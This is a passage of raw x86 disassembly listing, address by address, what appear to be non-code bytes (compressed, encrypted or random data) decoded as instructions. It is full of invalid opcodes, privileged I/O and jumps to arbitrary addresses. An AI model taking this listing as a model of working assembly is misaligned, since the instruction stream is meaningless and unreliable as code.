  4093b5:	sub    eax,0x84582504
  4093ba:	sti    
  4093bb:	int3   
  4093bc:	imul   eax,DWORD PTR [edi+0x67],0x801f69fe
  4093c3:	lahf   
  4093c4:	sub    esi,ecx
  4093c6:	xlat   BYTE PTR ds:[ebx]
  4093c7:	xor    edi,DWORD PTR [ebp+0x73d2f76]
  4093cd:	xchg   esi,eax
  4093ce:	xor    cl,BYTE PTR [eax-0x5d]
  4093d1:	mov    ds:0xe05dd4ff,al
  4093d6:	fwait
  4093d7:	xchg   ebp,eax
  4093d8:	inc    edx
  4093d9:	dec    ebp
  4093da:	or     DWORD PTR [ebx-0x53],ecx
  4093dd:	dec    eax
  4093de:	inc    edx
  4093df:	inc    edi
  4093e0:	jbe    0x409417
  4093e2:	sub    eax,0xec3f250c
  4093e7:	add    ebx,esi
  4093e9:	mov    ah,0x6a
  4093eb:	pop    ebx
  4093ec:	xchg   ebp,eax
  4093ed:	dec    esp
  4093ee:	(bad)  
  4093ef:	push   es
  4093f0:	dec    BYTE PTR ds:0x982d432e
  4093f6:	aas    
  4093f7:	mov    esi,0x5a21ea30
  4093fc:	pop    es
  4093fd:	jp     0x40938c
  4093ff:	addr16 jae 0x4093c2
  409402:	fisubr WORD PTR [ebx+0x40206f5f]
  409408:	xor    al,0x91
  40940a:	str    WORD PTR [edx+0x7b]
  40940e:	ret    
  40940f:	mov    al,BYTE PTR [ebp-0x51af64f6]
  409415:	ret    
  409416:	mov    esp,0xe1eadfbf
  40941b:	sbb    al,0xfa
  40941d:	sti    
  40941e:	ss or  esp,esp
  409421:	mov    ebp,0xc04258fb
  409426:	adc    DWORD PTR [ebp-0x6],esp
  409429:	or     al,0xbc
  40942b:	jecxz  0x409466
  40942d:	push   cs
  40942e:	xor    al,dh
  409430:	mov    ?,ebx
  409432:	dec    ebx
  409433:	in     eax,dx
  409434:	sbb    eax,0xb9b49e90
  409439:	add    BYTE PTR [eax+0x45],ah
  40943c:	jmp    0x61522817
  409441:	jmp    0xf31a:0x7c5f795e
  409448:	fs pushf 
  40944a:	adc    BYTE PTR [ebp+0x61adc3ce],bh
  409450:	fidiv  DWORD PTR [esi+0x43ccaad5]
  409456:	push   DWORD PTR [eax+0x33508e69]
  40945c:	stc    
  40945d:	lods   eax,DWORD PTR ds:[esi]
  40945e:	cvtdq2ps xmm3,XMMWORD PTR [edx]
  409461:	and    al,0x5c
  409463:	cmc    
  409464:	lea    ebx,[ebx+0x1cbcd547]
  40946a:	sbb    ah,cl
  40946c:	jbe    0x4094c1
  40946e:	mov    eax,0x5745561e
  409473:	jns    0x4094b7
  409475:	sbb    al,0xf1
  409477:	dec    edi
  409478:	inc    esi
  409479:	push   cs
  40947a:	xlat   BYTE PTR ds:[ebx]
  40947b:	sub    BYTE PTR [ebx+0x410bead8],dh
  409481:	inc    ebx
  409482:	jb     0x4094f3
  409484:	dec    ebx
  409485:	mov    al,ds:0xd678cccb
  40948a:	dec    edi
  40948b:	dec    eax
  40948c:	push   cs
  40948d:	sahf   
  40948e:	lods   eax,DWORD PTR ds:[esi]
  40948f:	cmp    DWORD PTR [ebx-0x748d507e],esp
  409495:	and    BYTE PTR [ebp-0x5d53d5cc],dh
  40949b:	inc    esp
  40949c:	loop   0x4094ad
  40949e:	(bad)  
  4094a0:	jmp    0x40950a
  4094a2:	cwde   
  4094a3:	int3   
  4094a4:	xlat   BYTE PTR ds:[ebx]
  4094a5:	dec    ebx
  4094a6:	push   edx
  4094a7:	xor    BYTE PTR [ebx-0x1ca6fc93],dh
  4094ad:	lds    esp,FWORD PTR [ecx-0x63]
  4094b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094b1:	jo     0x409460
  4094b3:	xor    ah,BYTE PTR [edx]
  4094b5:	lea    esi,[ebx-0x7]
  4094b8:	and    eax,0x3810966a
  4094bd:	sub    BYTE PTR [edi-0x5d11a705],bl
  4094c3:	sbb    edx,DWORD PTR [edi]
  4094c5:	test   al,0x99
  4094c7:	push   es
  4094c8:	scas   eax,DWORD PTR es:[edi]
  4094c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094ca:	fsubr  st(4),st
  4094cc:	push   0x793cb0b0
  4094d1:	add    eax,0xb643b18c
  4094d6:	pop    edi
  4094d7:	mov    al,0xf4
  4094d9:	mov    edi,0xa69fbd60
  4094de:	mov    ecx,0x41b663e3
  4094e3:	and    DWORD PTR [eax-0x13b06daa],edx
  4094e9:	test   BYTE PTR [ebp+0x2e],dh
  4094ec:	ins    BYTE PTR es:[edi],dx
  4094ed:	push   ds
  4094ee:	add    eax,ebp
  4094f0:	out    0xeb,eax
  4094f2:	popa   
  4094f3:	cmp    dh,dh
  4094f5:	test   BYTE PTR [esi+eax*1+0x2a],dl
  4094f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094fa:	fisub  WORD PTR [edi+0x2b]
  4094fd:	mov    DWORD PTR [edi-0x50e2fbf],ecx
  409503:	std    
  409504:	add    eax,0x4d315359
  409509:	cmp    dh,BYTE PTR [edx]
  40950b:	(bad)
  40950e:	mov    ah,0xd8
  409510:	mov    ebp,0xf632ef8c
  409515:	jnp    0x40955f
  409517:	adc    al,0x52
  409519:	xor    bl,ch
  40951b:	xchg   ebx,eax
  40951c:	iret   
  40951d:	popf   
  40951e:	inc    ecx
  40951f:	mov    al,0x6f
  409521:	add    dh,BYTE PTR [eax-0x1c3d9857]
  409527:	retf   
  409528:	outs   dx,DWORD PTR ds:[esi]
  409529:	loop   0x4094b2
  40952b:	mov    gs,eax
  40952d:	mov    ss,WORD PTR [edi+ebx*1+0x50]
  409531:	ins    DWORD PTR es:[edi],dx
  409532:	add    al,0xb6
  409534:	aas    
  409535:	mov    bl,0xf
  409537:	cmp    bl,dl
  409539:	call   0xdade:0x5f66ead7
  409540:	push   0xffffffd6
  409542:	push   ecx
  409543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409544:	pop    ss
  409545:	pop    edi
  409546:	lods   al,BYTE PTR ds:[esi]
  409547:	xchg   DWORD PTR [esi+0x37],edi
  40954a:	ret    0x33db
  40954d:	push   0x407b4e27
  409552:	cmp    bl,BYTE PTR [eax+0x31]
  409555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409556:	movups xmm1,xmm0
  409559:	push   0xffffffd5
  40955b:	hlt    
  40955c:	sbb    bl,BYTE PTR [edi]
  40955e:	cmp    al,0xa
  409560:	xor    cl,bl
  409562:	pop    eax
  409563:	cmp    dh,ah
  409565:	sbb    eax,0x6dbd3e03
  40956a:	fwait
  40956b:	gs into 
  40956d:	or     esp,DWORD PTR [edi]
  40956f:	mov    esi,0x8321eb3f
  409574:	mov    al,0xf8
  409576:	pop    ss
  409577:	dec    ebp
  409578:	mov    dh,0xf8
  40957a:	mov    eax,ds:0xfb7cd535
  40957f:	(bad)
  409582:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409583:	mul    BYTE PTR [esi+0x892854f]
  409589:	daa    
  40958a:	iret   
  40958b:	(bad)  
  40958c:	loop   0x4095f1
  40958e:	(bad)  
  40958f:	fdivrp st(6),st
  409591:	jl     0x4095ca
  409593:	sbb    ebx,ecx
  409595:	jo     0x4095e4
  409597:	xchg   ebp,eax
  409598:	out    dx,eax
  409599:	es dec edx
  40959b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40959c:	sbb    bl,al
  40959e:	or     BYTE PTR [esi+ebx*4],ch
  4095a1:	inc    edx
  4095a2:	ins    DWORD PTR es:[edi],dx
  4095a3:	outs   dx,BYTE PTR ds:[esi]
  4095a4:	cmp    eax,0x59e4485d
  4095a9:	pop    edx
  4095aa:	inc    edx
  4095ab:	stos   DWORD PTR es:[edi],eax
  4095ac:	test   esp,ebx
  4095ae:	out    dx,eax
  4095af:	jb     0x4095dd
  4095b1:	repnz xor eax,ebx
  4095b4:	paddusw mm0,QWORD PTR [eax+0x44c2903]
  4095bb:	(bad)  
  4095bc:	xchg   ebx,eax
  4095bd:	adc    esi,DWORD PTR [ebp-0x7b]
  4095c0:	ret    0x8e69
  4095c3:	pop    esi
  4095c4:	in     al,dx
  4095c5:	add    eax,0x3fea479e
  4095ca:	jns    0x40955b
  4095cc:	fwait
  4095cd:	stos   DWORD PTR es:[edi],eax
  4095ce:	sbb    al,0x7e
  4095d0:	cdq    
  4095d1:	push   0xffffffaf
  4095d3:	sbb    al,0x10
  4095d5:	adc    edi,DWORD PTR [eax-0x63433aba]
  4095db:	mov    BYTE PTR [ecx+0x24],ah
  4095de:	stc    
  4095df:	jno    0x409654
  4095e1:	mov    BYTE PTR [ebx],bl
  4095e3:	(bad)  
  4095e4:	pushf  
  4095e5:	push   esp
  4095e6:	pop    edx
  4095e7:	lahf   
  4095e8:	aam    0xce
  4095ea:	addr16 mov ?,eax
  4095ed:	es scas eax,DWORD PTR es:[edi]
  4095ef:	jl     0x409637
  4095f1:	out    dx,eax
  4095f2:	xor    BYTE PTR [ecx+0x70620673],ch
  4095f8:	(bad)  
  4095f9:	push   es
  4095fa:	jp     0x4095f3
  4095fc:	inc    ecx
  4095fd:	cmp    BYTE PTR [edx],ch
  4095ff:	pop    esi
  409600:	jne    0x409597
  409602:	jbe    0x409621
  409604:	shr    al,0x64
  409607:	and    edi,DWORD PTR [ecx-0x26]
  40960a:	dec    esi
  40960b:	not    DWORD PTR [edi+0x77990f08]
  409611:	mov    ds:0x4ca38c3,al
  409616:	sub    ebx,DWORD PTR [esi+0x5cc432dd]
  40961c:	or     al,0xf3
  40961e:	ds add eax,0x49197588
  409624:	dec    ebx
  409625:	mov    edi,ds
  409627:	ja     0x40967e
  409629:	xchg   ebp,eax
  40962a:	push   esi
  40962b:	jmp    0xc2adda6c
  409630:	ja     0x409643
  409632:	add    eax,0x5f972cae
  409637:	ror    bh,1
  409639:	jae    0x40969e
  40963b:	pop    edx
  40963c:	arpl   sp,dx
  40963e:	pusha  
  40963f:	call   0x2a64ae9d
  409644:	pushf  
  409645:	das    
  409646:	inc    ebp
  409647:	sar    DWORD PTR [ebx-0x57],0xa8
  40964b:	data16 jbe 0x4095da
  40964e:	sahf   
  40964f:	or     ch,ah
  409651:	ins    BYTE PTR es:[edi],dx
  409652:	(bad)  
  409653:	cmc    
  409654:	jmp    0x940cc1c5
  409659:	mov    ebx,0x86fdf643
  40965e:	and    edi,edi
  409660:	push   ds
  409661:	lods   eax,DWORD PTR ds:[esi]
  409662:	pop    eax
  409663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409664:	mov    eax,0x81c9219b
  409669:	aas    
  40966a:	ins    BYTE PTR es:[edi],dx
  40966b:	xor    eax,0x3e2b1fb1
  409670:	stos   DWORD PTR es:[edi],eax
  409671:	push   esi
  409672:	xor    dh,dh
  409674:	test   DWORD PTR [ebx],ebx
  409676:	xor    eax,0x22a0aacf
  40967b:	xchg   esi,eax
  40967c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40967d:	test   DWORD PTR [ecx-0xa],ecx
  409680:	sub    edx,DWORD PTR [edx-0x7d]
  409683:	xchg   dl,bh
  409685:	xor    esi,ecx
  409687:	jecxz  0x40961b
  409689:	fidiv  WORD PTR [ebp+0x20]
  40968c:	adc    cl,BYTE PTR [edi+eax*1-0x10]
  409690:	mov    cs,ebx
  409692:	add    al,0x62
  409694:	pop    ss
  409695:	arpl   dx,sp
  409697:	fist   DWORD PTR [ecx+0x78]
  40969a:	iret   
  40969b:	out    0xde,eax
  40969d:	and    BYTE PTR [eax],al
  40969f:	int    0x2c
  4096a1:	repnz mov edx,edi
  4096a4:	push   esi
  4096a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096a6:	addr16 inc edx
  4096a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096a9:	inc    edi
  4096aa:	xchg   DWORD PTR [edx],ebx
  4096ac:	inc    ebp
  4096ad:	sbb    DWORD PTR [esp+esi*1],esp
  4096b0:	inc    eax
  4096b1:	and    esi,esp
  4096b3:	sahf   
  4096b4:	xor    BYTE PTR [edx],dl
  4096b6:	leave  
  4096b7:	mov    esp,0x7b8170b7
  4096bc:	xchg   DWORD PTR [edi-0x33],eax
  4096bf:	mov    dl,0xd3
  4096c1:	dec    eax
  4096c2:	sub    BYTE PTR [ebx-0x6b],ah
  4096c5:	pushf  
  4096c6:	popa   
  4096c7:	inc    esi
  4096c8:	cli    
  4096c9:	(bad)  
  4096ca:	pop    esp
  4096cb:	mov    BYTE PTR [esi-0x4b],bh
  4096ce:	or     dh,BYTE PTR [edi+0x49]
  4096d1:	xchg   edx,eax
  4096d2:	dec    esp
  4096d3:	add    dh,BYTE PTR [ebx+esi*8-0x476c1d91]
  4096da:	xchg   edx,eax
  4096db:	add    eax,0x76bd700a
  4096e0:	sub    esi,DWORD PTR [esi-0x27]
  4096e3:	cli    
  4096e4:	mov    esp,0xd781e399
  4096e9:	pop    ebx
  4096ea:	jbe    0x409739
  4096ec:	leave  
  4096ed:	dec    edx
  4096ee:	mov    ecx,edi
  4096f0:	dec    edx
  4096f1:	mov    al,ds:0xc74beab
  4096f6:	rol    ah,cl
  4096f8:	outs   dx,DWORD PTR ds:[esi]
  4096f9:	div    BYTE PTR [eax+0xd67b78e]
  4096ff:	js     0x4096de
  409701:	out    0xd2,eax
  409703:	mov    bl,0x80
  409705:	idiv   DWORD PTR [eax]
  409707:	(bad)  
  409708:	mov    esp,0xcc5af779
  40970d:	mov    ebp,0xdb3f9872
  409712:	inc    edi
  409713:	mov    ?,WORD PTR [eax+0x36]
  409716:	and    al,0x7b
  409718:	mov    ebx,0xc48e53a3
  40971d:	aad    0x33
  40971f:	pop    ecx
  409720:	adc    BYTE PTR [edx+0x55f2fecd],dh
  409726:	fnstenv [edx]
  409728:	std    
  409729:	sti    
  40972a:	js     0x409760
  40972c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40972d:	in     al,dx
  40972e:	adc    DWORD PTR [ecx+ebp*2+0x3543970b],0xffffffb7
  409736:	fs sub esp,edi
  409739:	clc    
  40973a:	cmc    
  40973b:	jecxz  0x40975c
  40973d:	xchg   esp,eax
  40973e:	add    al,0x29
  409740:	in     eax,0x2c
  409742:	into   
  409743:	jno    0x4096e9
  409745:	pop    esp
  409746:	sti    
  409747:	aas    
  409748:	test   al,0x5c
  40974a:	jno    0x40970e
  40974c:	inc    ecx
  40974d:	bound  ecx,QWORD PTR [ebp-0x4f]
  409750:	idiv   DWORD PTR [ecx]
  409752:	loope  0x4096e8
  409754:	push   ebp
  409755:	inc    esp
  409756:	or     esi,esp
  409758:	xchg   ebx,eax
  409759:	sub    cl,dh
  40975b:	or     BYTE PTR [eax-0x25],ch
  40975e:	ret    
  40975f:	mov    ebx,DWORD PTR [esi-0x12e3e373]
  409765:	aam    0x82
  409767:	in     al,0xb2
  409769:	std    
  40976a:	adc    BYTE PTR [eax+0xd],dh
  40976d:	mov    dh,0xed
  40976f:	ds push ebx
  409771:	arpl   ax,dx
  409773:	test   DWORD PTR [ebp-0x35],ecx
  409776:	hlt    
  409777:	pop    ebx
  409778:	(bad)  
  409779:	jnp    0x4097e8
  40977b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40977c:	js     0x4097ec
  40977e:	(bad)  
  40977f:	push   edx
  409780:	(bad)  
  409781:	or     ah,0x2
  409784:	cs pop esp
  409786:	jle    0x4097a1
  409788:	fwait
  409789:	lods   eax,DWORD PTR ds:[esi]
  40978a:	cmp    BYTE PTR [ecx-0x3e8dcc65],dh
  409790:	xchg   bl,dl
  409792:	ret    0xe7ba
  409795:	mov    bl,BYTE PTR [edi+esi*1+0x10]
  409799:	arpl   cx,dx
  40979b:	in     eax,dx
  40979c:	add    edi,DWORD PTR [ebx]
  40979e:	add    DWORD PTR [ebx-0x6d],edi
  4097a1:	xchg   edi,eax
  4097a2:	out    0xaa,eax
  4097a4:	xchg   esi,eax
  4097a5:	lahf   
  4097a6:	int    0x2f
  4097a8:	nop
  4097a9:	sub    eax,DWORD PTR [esi+0x76fc6819]
  4097af:	lods   al,BYTE PTR ds:[esi]
  4097b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097b2:	push   ebx
  4097b3:	sbb    DWORD PTR [edx],0x132eccb1
  4097b9:	add    DWORD PTR [esi+0x388ac4fd],ebp
  4097bf:	fdivr  DWORD PTR [ebx-0x5f4e19f0]
  4097c5:	pop    ebp
  4097c6:	xchg   ecx,eax
  4097c7:	pop    ecx
  4097c8:	sbb    al,0xe5
  4097ca:	xor    al,0x1c
  4097cc:	lock and esp,edx
  4097cf:	outs   dx,BYTE PTR ds:[esi]
  4097d0:	mov    cl,0xad
  4097d2:	test   al,0xb4
  4097d4:	add    ch,BYTE PTR [ecx]
  4097d6:	ret    
  4097d7:	push   ds
  4097d8:	js     0x4097da
  4097da:	test   al,0xb6
  4097dc:	retf   0x983
  4097df:	pop    edi
  4097e0:	imul   esi,edx,0x6f199f10
  4097e6:	xor    al,0x77
  4097e8:	sub    ch,al
  4097ea:	jno    0x40985a
  4097ec:	adc    eax,0x94410677
  4097f1:	cmp    DWORD PTR [ecx+0x421a449],ebp
  4097f7:	(bad)  
  4097f8:	test   eax,0x9b43232b
  4097fd:	xor    al,0x2c
  4097ff:	cmp    eax,0x59d7bc75
  409804:	std    
  409805:	sbb    edi,DWORD PTR [edx]
  409807:	out    dx,al
  409808:	les    edi,FWORD PTR [ebp+0x22978436]
  40980e:	dec    esi
  40980f:	push   0xffffffa2
  409811:	xor    eax,ebp
  409813:	jo     0x409804
  409815:	fnstenv [ebp+0x349ffa60]
  40981b:	cwde   
  40981c:	ja     0x409865
  40981e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40981f:	jge    0x409892
  409821:	add    BYTE PTR [ecx+0x6c5abbe2],bh
  409827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409828:	hlt    
  409829:	je     0x409883
  40982b:	mov    al,0x2e
  40982d:	loopne 0x40989b
  40982f:	add    edi,DWORD PTR [ebx-0x64c2197]
  409835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409836:	xchg   esi,eax
  409837:	sar    DWORD PTR [esi+0x4c68c3bb],0xef
  40983e:	test   DWORD PTR [ecx+edi*1+0x5],edx
  409842:	cdq    
  409843:	fidivr DWORD PTR [edx]
  409845:	add    DWORD PTR [ecx+0x38],esp
  409848:	loope  0x4097ea
  40984a:	jbe    0x4098bd
  40984c:	mov    al,ds:0x60fabd4a
  409851:	clc    
  409852:	inc    edx
  409853:	(bad)  [esi+0x56fc329]
  409859:	in     eax,0x6a
  40985b:	icebp  
  40985c:	std    
  40985d:	adc    ebx,DWORD PTR [esi+ebx*4+0x1c966859]
  409864:	iret   
  409865:	imul   ebp,DWORD PTR [esi],0xfffffff0
  409868:	pop    edi
  409869:	outs   dx,BYTE PTR ds:[esi]
  40986a:	aaa    
  40986b:	int    0x63
  40986d:	int    0xd1
  40986f:	dec    eax
  409870:	es jp  0x4098ac
  409873:	or     edi,ecx
  409875:	jp     0x409839
  409877:	mov    edx,0x62b6d955
  40987c:	pop    ss
  40987d:	pop    edx
  40987e:	add    BYTE PTR [eax-0x1536ddb7],bh
  409884:	or     al,0x41
  409886:	sti    
  409887:	retf   
  409888:	xchg   edx,eax
  409889:	and    DWORD PTR [eax+0x33],0x2c43cb89
  409890:	inc    ecx
  409891:	jae    0x409855
  409893:	mov    al,ds:0xdc366ed9
  409898:	clc    
  409899:	mov    ebp,0x1bbd883c
  40989e:	int    0x76
  4098a0:	int3   
  4098a1:	jo     0x409841
  4098a3:	es loop 0x409839
  4098a6:	stos   DWORD PTR es:[edi],eax
  4098a7:	mov    esp,0x58c53176
  4098ac:	shl    BYTE PTR [edi-0x29fc5b5b],0x41
  4098b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098b4:	push   0x48
  4098b6:	jmp    0xf82:0x9147690
  4098bd:	bound  esi,QWORD PTR [ecx-0x71d6cbe5]
  4098c3:	ret    
  4098c4:	sar    DWORD PTR [ebx-0xb3740ad],0xd1
  4098cb:	pushf  
  4098cc:	jge    0x40990e
  4098ce:	mov    ch,0xb5
  4098d0:	pop    ebx
  4098d1:	into   
  4098d2:	cmp    ch,BYTE PTR [esi-0x567d49f4]
  4098d8:	js     0x4098d9
  4098da:	or     al,0xdc
  4098dc:	loopne 0x409933
  4098de:	leave  
  4098df:	xor    al,0x44
  4098e1:	mov    eax,0xee7109cd
  4098e6:	xor    al,0xdf
  4098e8:	mov    WORD PTR [ebp-0x52],?
  4098eb:	call   0xfd72:0xf72a1f32
  4098f2:	popa   
  4098f3:	jno    0x4098f4
  4098f5:	mov    ebp,0x2aec25f8
  4098fa:	lods   al,BYTE PTR ds:[esi]
  4098fb:	mov    ah,BYTE PTR [eax+0x44]
  4098fe:	xchg   BYTE PTR [edx-0x1ca68a2],dh
  409904:	dec    edx
  409905:	sub    al,0xcb
  409907:	daa    
  409908:	outs   dx,BYTE PTR ds:[esi]
  409909:	mov    gs,WORD PTR [ecx-0x54]
  40990c:	add    cl,al
  40990e:	push   es
  40990f:	mov    ch,0x99
  409911:	push   edx
  409912:	repz jae 0x4098d9
  409915:	and    ah,BYTE PTR [edx-0x7a]
  409918:	xor    BYTE PTR [edi+ebx*1+0x29af419a],0x2b
  409920:	cmp    al,0xcb
  409922:	mov    DWORD PTR [edi+0x2150dce7],ebp
  409928:	mov    ebp,0xdff6b22a
  40992d:	jl     0x40995e
  40992f:	imul   BYTE PTR [ecx-0x20077eaf]
  409935:	cwde   
  409936:	lock imul edi,DWORD PTR [ecx-0x2adf2693],0xfffffffb
  40993e:	in     al,0xdd
  409940:	sbb    ebx,DWORD PTR [edi+0x840d29a]
  409946:	mov    ebx,DWORD PTR [edx]
  409948:	push   0x2d
  40994a:	jmp    0x579a7880
  40994f:	inc    ebp
  409950:	inc    edi
  409951:	cdq    
  409952:	aam    0x3b
  409954:	in     al,dx
  409955:	iret   
  409956:	pop    es
  409957:	sub    DWORD PTR [esi-0x48385105],ebp
  40995d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40995e:	(bad)  
  40995f:	xlat   BYTE PTR ds:[ebx]
  409960:	xchg   ebp,eax
  409961:	xor    al,0x18
  409963:	sub    DWORD PTR [eax+0x6946f6b1],edi
  409969:	jecxz  0x4098f6
  40996b:	(bad)  
  40996c:	sub    edi,DWORD PTR [edi-0xeb362bf]
  409972:	mov    esp,0x81b5545b
  409977:	in     eax,dx
  409978:	and    ah,BYTE PTR es:[edx]
  40997b:	xor    DWORD PTR [ecx],0xffffffcc
  40997e:	or     ecx,DWORD PTR [ebx+0xc]
  409981:	dec    esp
  409982:	jb     0x4099c8
  409984:	not    BYTE PTR [ecx+0x5a]
  409987:	mov    WORD PTR [esi],ds
  409989:	pop    eax
  40998a:	int    0xdb
  40998c:	jmp    0x409931
  40998e:	cmp    edx,DWORD PTR [edi]
  409990:	sbb    ch,BYTE PTR [esi]
  409992:	sub    ah,bl
  409994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409995:	push   ebp
  409996:	or     bh,BYTE PTR [eax+0xed53677]
  40999c:	sub    BYTE PTR [ecx],bh
  40999e:	xor    esi,0xe0c85eae
  4099a4:	out    0x39,eax
  4099a6:	or     DWORD PTR [edx-0x1b],ebp
  4099a9:	xchg   ebp,eax
  4099aa:	adc    dh,dl
  4099ac:	std    
  4099ad:	adc    DWORD PTR [edi+edx*1-0x11],eax
  4099b1:	push   0xffffffbf
  4099b3:	jnp    0x670b7856
  4099b9:	jg     0x409954
  4099bb:	test   BYTE PTR [eax],0x9b
  4099be:	test   eax,0xd59abafc
  4099c3:	and    DWORD PTR [esi+ebp*8],0xffffffb1
  4099c7:	mov    al,0x86
  4099c9:	xchg   esi,eax
  4099ca:	xchg   ebx,eax
  4099cb:	sub    eax,0x8711913
  4099d0:	int3   
  4099d1:	test   eax,0x8d0cdcae
  4099d6:	mov    BYTE PTR [edx],bl
  4099d8:	out    0x60,al
  4099da:	jo     0x409963
  4099dc:	leave  
  4099dd:	jno    0x409a48
  4099df:	dec    ebp
  4099e0:	shl    DWORD PTR [eax-0x588c5f93],1
  4099e6:	push   ecx
  4099e7:	outs   dx,DWORD PTR ds:[esi]
  4099e8:	and    BYTE PTR [ebp+0x5d],ch
  4099eb:	mov    esi,0x83eadb52
  4099f0:	fsubr  QWORD PTR [eax+0xb]
  4099f3:	xchg   ebp,eax
  4099f4:	pop    ss
  4099f5:	mov    ebx,0x27ef7a70
  4099fa:	test   DWORD PTR [eax-0x12],0x6ee32503
  409a01:	scas   eax,DWORD PTR es:[edi]
  409a02:	xchg   DWORD PTR [edi],esp
  409a04:	cli    
  409a05:	and    DWORD PTR [edi],0x47
  409a08:	inc    edi
  409a09:	stc    
  409a0a:	stos   BYTE PTR es:[edi],al
  409a0b:	dec    esp
  409a0c:	ins    DWORD PTR es:[edi],dx
  409a0d:	out    dx,al
  409a0e:	mov    ah,0x1a
  409a10:	mov    esp,0x995b7142
  409a15:	dec    edx
  409a16:	scas   eax,DWORD PTR es:[edi]
  409a17:	scas   eax,DWORD PTR es:[edi]
  409a18:	inc    eax
  409a19:	pusha  
  409a1a:	in     eax,dx
  409a1b:	lahf   
  409a1c:	mov    cl,0x96
  409a1e:	jle    0x409a22
  409a20:	stc    
  409a21:	shl    ebx,cl
  409a23:	imul   edi,DWORD PTR [ebx-0x25],0x56
  409a27:	arpl   WORD PTR [ebp-0x6c],ax
  409a2a:	sub    DWORD PTR [ebx],ecx
  409a2c:	mov    ?,ecx
  409a2e:	mov    ds:0x49bdbf85,eax
  409a33:	xchg   edx,eax
  409a34:	bound  ecx,QWORD PTR [edi+0x351b844e]
  409a3a:	fst    DWORD PTR [edx]
  409a3c:	xchg   ebx,eax
  409a3d:	xlat   BYTE PTR ds:[ebx]
  409a3e:	js     0x409a1d
  409a40:	arpl   WORD PTR [edi],bx
  409a42:	idiv   DWORD PTR [edx+0x22e11687]
  409a48:	cmp    dl,ch
  409a4a:	xchg   BYTE PTR [eax+0x7a],dl
  409a4d:	mov    bl,0x48
  409a4f:	cli    
  409a50:	xchg   DWORD PTR [edx],eax
  409a52:	pusha  
  409a53:	pop    edx
  409a54:	enter  0x8787,0x25
  409a58:	sti    
  409a59:	cvttps2pi mm5,xmm4
  409a5c:	pop    ebx
  409a5d:	into   
  409a5e:	pop    ebx
  409a5f:	and    DWORD PTR [edx+0x7bae37be],eax
  409a65:	mov    esp,0xe5db9df8
  409a6a:	push   0xc78e9eba
  409a6f:	jge    0x4099f6
  409a71:	cli    
  409a72:	mov    ecx,0x8938f34b
  409a77:	mov    ah,0x36
  409a79:	icebp  
  409a7a:	sub    BYTE PTR [esi-0x65],ch
  409a7d:	mov    BYTE PTR [eax],cl
  409a7f:	stos   BYTE PTR es:[edi],al
  409a80:	cmp    BYTE PTR [ecx],bh
  409a82:	and    BYTE PTR [eax],ch
  409a84:	mov    WORD PTR [ebx-0x7379dc21],gs
  409a8a:	push   ss
  409a8b:	jge    0x409ac2
  409a8d:	push   es
  409a8e:	add    eax,0x12dc8ef1
  409a93:	sahf   
  409a94:	xchg   esi,eax
  409a95:	repnz int3 
  409a97:	aad    0xc2
  409a99:	aam    0x1a
  409a9b:	add    DWORD PTR [edi+0x1f44d128],0x34b15ed7
  409aa5:	xchg   ecx,eax
  409aa6:	mov    ds:0x6eb59d5e,eax
  409aab:	push   eax
  409aac:	sub    bh,BYTE PTR [edi]
  409aae:	jbe    0x409a3c
  409ab0:	pusha  
  409ab1:	popf   
  409ab2:	dec    edx
  409ab3:	and    DWORD PTR [ebp+eax*2-0x6c],ebp
  409ab7:	xor    BYTE PTR [ebp+0x3b873473],ch
  409abd:	inc    ecx
  409abe:	mov    ebp,0xb169e36a
  409ac3:	push   edi
  409ac4:	cmp    esp,ebp
  409ac6:	xor    edi,DWORD PTR [ecx+0x7c7d3d05]
  409acc:	lahf   
  409acd:	dec    esp
  409ace:	sbb    bl,BYTE PTR [edx+edi*4]
  409ad1:	sub    eax,0x3c6fc5fa
  409ad6:	push   edi
  409ad7:	and    BYTE PTR [esi+0x6d94d39b],dl
  409add:	shl    DWORD PTR [edx+ecx*2-0x5d],cl
  409ae1:	xor    eax,0xae64f6
  409ae6:	sub    BYTE PTR [ecx+0x38],ah
  409ae9:	xchg   ebx,eax
  409aea:	lds    esi,FWORD PTR [ecx-0x5d4d7e24]
  409af0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409af1:	les    eax,FWORD PTR [eax-0x44]
  409af4:	fidivr DWORD PTR [edi-0x43]
  409af7:	inc    esp
  409af8:	mov    eax,0x666b25d3
  409afd:	ret    
  409afe:	out    dx,eax
  409aff:	push   edi
  409b00:	jnp    0x409b66
  409b02:	push   edi
  409b03:	and    eax,0xadb6d597
  409b08:	bound  ebp,QWORD PTR [edi]
  409b0a:	aaa    
  409b0b:	hlt    
  409b0c:	pop    esp
  409b0d:	ins    BYTE PTR es:[edi],dx
  409b0e:	std    
  409b0f:	add    dh,BYTE PTR [ebx]
  409b11:	js     0x409aed
  409b13:	inc    ecx
  409b14:	xchg   ecx,eax
  409b15:	ds push 0xb547f508
  409b1b:	ins    DWORD PTR es:[edi],dx
  409b1c:	inc    esi
  409b1d:	les    edi,FWORD PTR [edi]
  409b1f:	jmp    0xeebe:0xc2523bf4
  409b26:	and    BYTE PTR [edi],0xfe
  409b29:	mov    BYTE PTR [eax-0x50411546],al
  409b2f:	popa   
  409b30:	jge    0x409b9c
  409b32:	cld    
